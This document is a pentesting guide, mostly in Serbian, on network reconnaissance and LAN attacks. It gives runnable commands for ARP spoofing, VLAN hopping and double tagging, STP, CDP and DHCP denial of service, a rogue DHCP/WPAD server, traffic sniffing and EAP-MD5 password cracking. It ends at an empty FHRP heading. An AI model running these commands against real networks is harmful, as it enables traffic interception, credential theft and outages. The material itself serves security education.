# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Otkrivanje hosts sa Interneta

Ovo će biti **kratak odeljak** o tome kako pronaći **IPs koji odgovaraju** sa **Interneta**.\
U ovoj situaciji imate neki **scope of IPs** (možda čak i nekoliko **ranges**) i samo treba da pronađete **koji IPs odgovaraju**.

### ICMP

Ovo je **najjači** i **najbrži** način da otkrijete da li je host aktivan ili ne.\
Možete pokušati poslati neke **ICMP** pakete i **očekivati odgovore**. Najjednostavniji način je poslati **echo request** i očekivati odgovor. To možete uraditi jednostavnim `ping` ili korišćenjem `fping` za **ranges**.\
Takođe možete koristiti **nmap** da pošaljete druge tipove ICMP paketa (ovo će izbeći filtere na uobičajeni ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Veoma je često da su svi tipovi ICMP paketa filtrirani. Onda je jedino što možete da uradite da proverite da li je host aktivan — **try to find open ports**. Svaki host ima **65535 ports**, tako da, ako imate "big" scope, ne možete testirati da li je **each port** svakog hosta open ili ne, to bi oduzelo previše vremena.\
Dakle, ono što vam treba je **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) i lista najčešće korišćenih **ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Takođe možete izvršiti ovaj korak pomoću `nmap`, ali je sporiji i `nmap` ima problema sa identifikovanjem aktivnih hostova.

### HTTP Port Discovery

Ovo je samo TCP otkrivanje portova korisno kada želite da se **fokusirate na otkrivanje HTTP** **servisa**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Otkrivanje UDP portova

Takođe možete pokušati da proverite da li je neki **otvoren UDP port** da biste odlučili da li treba da **posvetite više pažnje** nekom **host.** Pošto UDP servisi obično **ne odgovaraju** sa **nikakvim podacima** na običan prazan UDP probe paket, teško je reći da li je port filtriran ili otvoren. Najlakši način da to odlučite je da pošaljete paket vezan za servis koji radi, a pošto ne znate koji servis radi, trebalo bi da probate najverovatnije na osnovu broja porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Prethodno predložena nmap komanda će testirati **top 1000 UDP ports** na svakom hostu unutar **/24** opsega, ali čak i ovo će potrajati **>20min**. Ako su vam potrebni **najbrži rezultati**, možete koristiti [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Ovo će poslati ove **UDP probes** na njihove **expected port** (za /24 opseg ovo će trajati samo 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Ovde možete pronaći dobar vodič o svim dobro poznatim Wifi attacks u vreme pisanja:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Otkrivanje hosts iznutra

Ako ste unutar network-a, jedna od prvih stvari koje ćete želeti da uradite je da **otkrijete druge hosts**. U zavisnosti od **koliko buke** možete/želite da napravite, mogu se preduzeti različite akcije:

### Pasivno

Možete koristiti ove alate za pasivno otkrivanje hosts unutar povezane network:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktivno

Imajte na umu da tehnike opisane u [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) takođe mogu biti **primenjene ovde**.\
Ali, pošto ste u **istoj mreži** kao i ostali hostovi, možete uraditi **više stvari**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Imajte na umu da tehnike pomenute u _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) takođe mogu biti **primenjene ovde**.\
Međutim, pošto se nalazite u **istoј mreži** kao i ostali hostovi, možete uraditi **više stvari**:

- Ako **pingujete** **broadcast adresu podmreže** ping bi trebalo da stigne do **svakog hosta** i oni bi mogli **vama odgovoriti**: `ping -b 10.10.5.255`
- Pingovanjem **broadcast adrese mreže** možete čak pronaći hostove u okviru **drugih podmreža**: `ping -b 255.255.255.255`
- Koristite `-PE`, `-PP`, `-PM` flagove `nmap`-a da izvršite otkrivanje hostova slanjem redom **ICMPv4 echo**, **timestamp**, i **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se koristi za **uključivanje** računara putem **mrežne poruke**. Magic packet koji se koristi za uključivanje računara je paket u kojem je naveden **MAC Dst** i koji se zatim **ponavlja 16 puta** unutar istog paketa.\
Takvi paketi se obično šalju u okviru **ethernet 0x0842** ili u **UDP paketu na port 9**.\
Ako **nije navedena \[MAC]**, paket se šalje na **broadcast ethernet** (i broadcast MAC će biti onaj koji se ponavlja).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skeniranje hostova

Kada otkrijete sve IP adrese (eksterne ili interne) koje želite detaljno skenirati, mogu se preduzeti različite akcije.

### TCP

- **Otvoren** port: _SYN --> SYN/ACK --> RST_
- **Zatvoren** port: _SYN --> RST/ACK_
- **Filtriran** port: _SYN --> \[NEMA ODGOVORA]_
- **Filtriran** port: _SYN --> ICMP poruka_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Postoje 2 opcije za skeniranje UDP porta:

- Pošaljite **UDP packet** i proverite za odgovor _**ICMP unreachable**_ ako je port **closed** (u nekoliko slučajeva ICMP će biti **filtered**, pa nećete dobiti nikakvu informaciju da li je port **closed** ili **open**).
- Pošaljite **formatted datagrams** da izazovete odgovor od **service** (npr., DNS, DHCP, TFTP i druge, kako je navedeno u _nmap-payloads_). Ako dobijete **response**, port je **open**.

**Nmap** će **kombinovati oba** pristupa koristeći "-sV" (UDP scans su veoma spori), ali imajte na umu da su UDP scans sporiji od TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** je dizajniran da se koristi uz **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Njegova glavna svrha je da omogući prenos telefonskih podataka preko IP mreža, odražavajući mnoge karakteristike pouzdanosti koje se nalaze u **Signaling System 7 (SS7)**. **SCTP** je ključna komponenta familije protokola **SIGTRAN**, koja ima za cilj prenos SS7 signala preko IP mreža.

Podršku za **SCTP** pružaju različiti operativni sistemi, kao što su **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, i **VxWorks**, što ukazuje na njegovu široku prihvaćenost i upotrebljivost u oblasti telekomunikacija i umrežavanja.

Dva različita skeniranja za SCTP nudi nmap: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Više nmap opcija**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Otkrivanje internih IP adresa

Pogrešno konfigurisani ruteri, firewalls i mrežni uređaji ponekad odgovaraju na mrežne probe koristeći nejavne izvorne adrese. tcpdump se može koristiti za identifikovanje paketa primljenih sa privatnih adresa tokom testiranja. Konkretno, na Kali Linuxu, paketi se mogu hvatati na eth2 interfejsu, koji je dostupan sa javnog Interneta. Važno je napomenuti da, ako je vaša konfiguracija iza NAT-a ili Firewall-a, takvi paketi će verovatno biti filtrirani.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing vam omogućava da saznate detalje o IP ranges, subnet sizes, MAC addresses i hostnames pregledom uhvaćenih frejmova i paketa. Ako je mreža pogrešno konfigurisana ili je switching fabric pod opterećenjem, napadači mogu da presretnu osetljiv materijal putem passive network sniffing.

Ako je switched Ethernet network pravilno konfigurisana, videćete samo broadcast frames i materijal upućen na vašu MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Takođe je moguće presretati pakete sa udaljene mašine preko SSH sesije koristeći Wireshark kao GUI u realnom vremenu.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Očigledno.

### Capturing credentials

Možete koristiti alate kao što su [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) da parsirate kredencijale iz pcap fajla ili sa live interfejsa.

## LAN attacks

### ARP spoofing

ARP Spoofing se sastoji u slanju gratuitous ARPResponses da označi da IP neke mašine ima MAC našeg uređaja. Zatim, victim će promeniti ARP table i obraćati se našem uređaju svaki put kada želi da kontaktira spoofed IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Prezasićite CAM table switcha slanjem velikog broja paketa sa različitim source mac address. Kada je CAM table puna, switch počinje da se ponaša kao hub (broadcasting all the traffic).
```bash
macof -i <interface>
```
In modern switches this vulnerability has been fixed.

### 802.1Q VLAN / DTP napadi

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** je dizajniran kao protokol link sloja koji omogućava automatski sistem za trunking, dozvoljavajući switches-ima da automatski biraju portove za režim (Trunk) ili non-trunk mode. Deploy-ovanje **DTP** se često smatra pokazateljem suboptimalnog dizajna mreže, što naglašava važnost ručne konfiguracije trunk-ova samo tamo gde je neophodno i obezbeđivanja odgovarajuće dokumentacije.

Po defaultu, portovi na switch-evima su podešeni da rade u Dynamic Auto modu, što znači da su spremni da iniciraju trunking ako ih prompt-uje susedni switch. Bezbednosni problem nastaje kada pentester ili napadač poveže uređaj na switch i pošalje DTP Desirable frame, prisiljavajući port da uđe u trunk režim. Ovaj potez omogućava napadaču da enumeriše VLAN-ove kroz analizu STP frame-ova i zaobiđe VLAN segmentaciju postavljanjem virtualnih interfejsa.

Prisutnost DTP-a u mnogim switch-evima po defaultu može biti iskorišćena od strane protivnika da oponaša ponašanje switch-a, čime dobija pristup saobraćaju preko svih VLAN-ova. Skripta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se koristi za nadgledanje interfejsa, otkrivajući da li je switch u Default, Trunk, Dynamic, Auto, ili Access modu — pri čemu je Access jedina konfiguracija imuna na VLAN hopping napade. Ovaj alat procenjuje status ranjivosti switch-a.

Ukoliko se identifikuje ranjivost mreže, alat _**Yersinia**_ može biti upotrebljen da "enable trunking" preko DTP protokola, omogućavajući posmatranje paketa iz svih VLAN-ova.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Za enumeraciju VLAN-ova takođe je moguće generisati DTP Desirable frame pomoću skripte [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**emojte prekidati skriptu ni pod kojim okolnostima. Ubrizgava DTP Desirable svakih tri sekunde. **Dinamički kreirani trunk kanali na switchu žive samo pet minuta. Nakon pet minuta, trunk pada.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Želim da istaknem da **Access/Desirable (0x03)** označava da je DTP frame tipa Desirable, što govori portu da pređe u Trunk mode. A **802.1Q/802.1Q (0xa5** označava **802.1Q** tip enkapsulacije.

Analizom STP frame-ova, **saznajemo za postojanje VLAN 30 i VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Napad na određene VLAN-ove

Kada znate VLAN ID-ove i IP adrese, možete **konfigurisati virtuelni interfejs da napadnete određeni VLAN**.\
Ako DHCP nije dostupan, koristite _ifconfig_ za postavljanje statičke IP adrese.

<details>
<summary>Konfiguracija VLAN interfejsa (primer)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Razmatrani napad **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** drugih VLAN-ova se **automatski izvodi** pomoću alata: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Ako napadač zna vrednost **MAC, IP i VLAN ID žrtve**, mogao bi pokušati da **double tag a frame** sa svojom dodeljenom VLAN-om i VLAN-om žrtve i poslati paket. Pošto **žrtva neće moći da se poveže nazad** sa napadačem, **najbolja opcija za napadača je communicate via UDP** ka protokolima koji mogu izvršiti neke interesantne akcije (poput SNMP).

Druga opcija za napadača je da pokrene **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (verovatno preko interneta). Zatim napadač može sniff-ovati na drugom hostu koji poseduje da proveri da li prima pakete od žrtve.

![](<../../images/image (190).png>)

Za izvođenje ovog napada možete koristiti scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Zaobilaženje lateralne VLAN segmentacije <a href="#d679" id="d679"></a>

Ako imate **pristup switch-u na koji ste direktno povezani**, imate mogućnost da **zaobiđete VLAN segmentation** unutar mreže. Jednostavno **prebacite port u trunk mode** (poznato i kao trunk), kreirajte virtual interfaces sa ID-jevima ciljnih VLAN-ova i konfigurišite IP adresu. Možete pokušati zatražiti adresu dinamički (DHCP) ili je konfigurisati statički. Zavisno od slučaja.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Zaobilaženje Layer 3 private VLAN-a

U određenim okruženjima, kao što su guest wireless networks, podešavanja **port isolation (poznato i kao private VLAN)** se primenjuju kako bi se sprečilo da klijenti povezani na wireless access point direktno komuniciraju međusobno. Međutim, identifikovana je tehnika koja može zaobići ove mere izolacije. Ova tehnika iskorišćava ili nedostatak network ACLs ili njihovu nepravilnu konfiguraciju, omogućavajući IP paketima da budu rutirani kroz router kako bi stigli do drugog klijenta na istoj mreži.

Napad se izvodi kreiranjem **paketa koji nosi IP adresu odredišnog klijenta ali sa MAC adresom rutera**. To uzrokuje da router greškom prosledi paket ciljanom klijentu. Ovaj pristup je sličan onom korišćenom u Double Tagging Attacks, gde se sposobnost kontrole hosta dostupnog žrtvi koristi za eksploatisanje sigurnosne propuste.

**Ključni koraci napada:**

1. **Kreiranje paketa:** Paket je posebno kreiran da sadrži IP adresu ciljanog klijenta, ali sa MAC adresom rutera.
2. **Iskorišćavanje ponašanja rutera:** Kreirani paket se šalje ka ruteru koji, zbog konfiguracije, preusmerava paket na ciljanog klijenta, zaobilažeći izolaciju pruženu podešavanjima private VLAN-a.

### VTP napadi

VTP (VLAN Trunking Protocol) centralizuje upravljanje VLAN-ovima. Koristi revision numbers za održavanje integriteta VLAN baze podataka; svaka izmena uvećava ovaj broj. Switch-evi usvajaju konfiguracije sa višim revision numbers, ažurirajući svoje VLAN baze podataka.

#### Uloge u VTP domenu

- **VTP Server:** Upravljа VLAN-ovima—kreira, briše, modifikuje. Emituje VTP announcements članovima domena.
- **VTP Client:** Prima VTP announcements kako bi sinhronizovao svoju VLAN bazu podataka. Ova uloga je ograničena i ne može vršiti lokalne izmene VLAN konfiguracije.
- **VTP Transparent:** Ne učestvuje u VTP update-ima, ali prosleđuje VTP announcements. Nije pogođen VTP attacks i održava konstantan revision number nula.

#### VTP Advertisement Types

- **Summary Advertisement:** Emituje ga VTP server svakih 300 sekundi, noseći osnovne informacije o domenu.
- **Subset Advertisement:** Šalje se nakon promena VLAN konfiguracije.
- **Advertisement Request:** Izdaje ga VTP client da zatraži Summary Advertisement, obično kao odgovor na detekciju višeg configuration revision number.

VTP ranjivosti se mogu eksploatisati isključivo preko trunk ports, jer VTP announcements cirkulišu samo kroz njih. Nakon DTP napada, scenariji se mogu preusmeriti na VTP. Alati poput Yersinia mogu olakšati VTP attacks, sa ciljem brisanja VLAN baze podataka, čime se efikasno remeti mreža.

Napomena: Ova diskusija se odnosi na VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
U grafičkom modu Yersinia, izaberite opciju deleting all VTP vlans da očistite VLAN bazu podataka.

### STP Napadi

**Ako ne možete da uhvatite BPDU frames na vašim interfejsima, malo je verovatno da ćete uspeti u STP napadu.**

#### **STP BPDU DoS**

Slanjem velikog broja BPDUs TCP (Topology Change Notification) ili Conf (the BPDUs that are sent when the topology is created) switchevi se preopterećuju i prestaju da rade ispravno.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Kada se pošalje TCP, CAM tabela switch-eva će biti obrisana za 15s. Zatim, ako kontinuirano šaljete ovakve packets, CAM tabela će se kontinuirano restartovati (ili na svakih 15segs) i kada se restartuje, switch se ponaša kao hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Napadač simulira ponašanje switch-a da bi postao STP root mreže. Tada će kroz njega prolaziti više saobraćaja. Ovo je interesantno kada ste povezani na dva različita switch-a.\
Ovo se postiže slanjem BPDUs CONF paketa koji navode da je vrednost **priority** manja od stvarne vrednosti aktuelnog root switch-a.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Ako je attacker povezan na 2 switches, on može biti root novog stabla i sav saobraćaj između tih switches će prolaziti kroz njega** (a MITM attack će biti izveden).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Napadi

CISCO Discovery Protocol (CDP) je ključan za komunikaciju između CISCO uređaja, omogućavajući im da **identifikuju jedni druge i dele detalje konfiguracije**.

#### Pasivno prikupljanje podataka <a href="#id-0e0f" id="id-0e0f"></a>

CDP je podešen da emituje informacije preko svih portova, što može predstavljati bezbednosni rizik. Napadač, pri povezivanju na switch port, može pokrenuti mrežne sniffere kao što su **Wireshark**, **tcpdump** ili **Yersinia**. Ova aktivnost može otkriti osetljive podatke o mrežnom uređaju, uključujući njegov model i verziju Cisco IOS-a koju koristi. Napadač potom može ciljati specifične ranjivosti u identifikovanoj verziji Cisco IOS-a.

#### Prouzrokovanje poplave CDP tabele <a href="#id-0d6a" id="id-0d6a"></a>

Agresivniji pristup uključuje pokretanje Denial of Service (DoS) napada preopterećivanjem memorije switch-a, prerušenjem u legitimne CISCO uređaje. Ispod se nalazi sekvenca komandi za iniciranje takvog napada koristeći Yersinia, mrežni alat namenjen testiranju:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Tokom ovog napada, CPU switcha i CDP tabela suseda su jako opterećeni, što dovodi do onoga što se često naziva **“paraliza mreže”** zbog prekomernog korišćenja resursa.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Takođe možete koristiti [**scapy**](https://github.com/secdev/scapy/). Obavezno ga instalirajte sa paketom `scapy/contrib`.

### VoIP napadi i alat VoIP Hopper

VoIP telefoni, koji su sve češće integrisani sa IoT uređajima, nude funkcionalnosti kao što su otključavanje vrata ili upravljanje termostatom putem specijalnih telefonskih brojeva. Međutim, ova integracija može predstavljati bezbednosne rizike.

Alat [**voiphopper**](http://voiphopper.sourceforge.net) je dizajniran da emulira VoIP telefon u različitim okruženjima (Cisco, Avaya, Nortel, Alcatel-Lucent). On otkriva VLAN ID glasovne mreže koristeći protokole kao što su CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** nudi tri režima za Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analizira mrežne pakete kako bi identifikovao VLAN ID.
2. **Spoof Mode** (`-c 1`): Generiše prilagođene pakete koji imitiraju pakete stvarnog VoIP uređaja.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Šalje pakete identične onima određenog modela Cisco IP telefona.

Za brzinu je preferiran treći režim. Potrebno je navesti:

- mrežni interfejs napadača (`-i` parametar).
- ime VoIP uređaja koji se emulira (`-E` parametar), u skladu sa Cisco formatom imenovanja (npr. SEP praćeno MAC adresom).

U korporativnim okruženjima, da bi se oponašao postojeći VoIP uređaj, može se:

- pregledati MAC nalepnica na telefonu.
- pregledati podešavanja na ekranu telefona da biste videli informacije o modelu.
- povezati VoIP uređaj na laptop i posmatrati CDP zahteve koristeći Wireshark.

Primer komande za izvršavanje alata u trećem režimu bio bi:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Napadi

#### Enumeracija
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dva tipa DoS-a** mogu se izvesti protiv DHCP servera. Prvi se sastoji u **simuliranju dovoljnog broja lažnih hostova da se iskoriste sve moguće IP adrese**.\
Ovaj napad će delovati samo ako možete videti odgovore DHCP servera i kompletirati protokol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na primer, ovo **nije moguće u Wifi mrežama**.

Drugi način da se izvede DHCP DoS je slanje **DHCP-RELEASE paketa koristeći kao source svaku moguću IP adresu**. Tada će server pomisliti da je svako prestao da koristi IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Automatizovaniji način za ovo je korišćenje alata [DHCPing](https://github.com/kamorin/DHCPig)

Možete iskoristiti pomenute DoS napade da primorate klijente da dobiju nove lease-ove u okruženju i iscrpite legitimne servere tako da postanu neodgovarajući. Kada legitimni pokušaju ponovo da se povežu, **možete poslužiti zlonamerne vrednosti pomenute u narednom napadu**.

#### Postavljanje zlonamernih vrednosti

Lažni DHCP server može se podići koristeći DHCP skriptu koja se nalazi na `/usr/share/responder/DHCP.py`. Ovo je korisno za network napade, kao što je presretanje HTTP saobraćaja i kredencijala, preusmeravanjem saobraćaja na zlonamerni server. Međutim, postavljanje lažnog gateway-a je manje efikasno jer omogućava samo presretanje odlaznog saobraćaja sa klijenta, propuštajući odgovore sa pravog gateway-a. Umesto toga, preporučuje se postavljanje lažnog DNS ili WPAD servera za efikasniji napad.

Ispod su opcije komandi za konfigurisanje lažnog DHCP servera:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

Ispravnim korišćenjem ovih opcija može se uspostaviti lažni DHCP server koji efikasno presreće mrežni saobraćaj.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP napadi**

Evo nekoliko taktika napada koje se mogu koristiti protiv 802.1X implementacija:

- Aktivno brute-force napadanje lozinki preko EAP
- Napad na RADIUS server sa neispravnim EAP sadržajem _\*\*_(exploits)
- Hvatanje EAP poruka i offline razbijanje lozinki (EAP-MD5 i PEAP)
- Forsiranje EAP-MD5 autentifikacije da bi se zaobišla provera TLS sertifikata
- Ubacivanje zlonamernog mrežnog saobraćaja prilikom autentifikacije koristeći hub ili slično

Ako je napadač između žrtve i servera za autentifikaciju, mogao bi pokušati da degradira (po potrebi) protokol autentifikacije na EAP-MD5 i uhvati pokušaj autentifikacije. Zatim bi ovo mogao brute-force-ovati koristeći:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

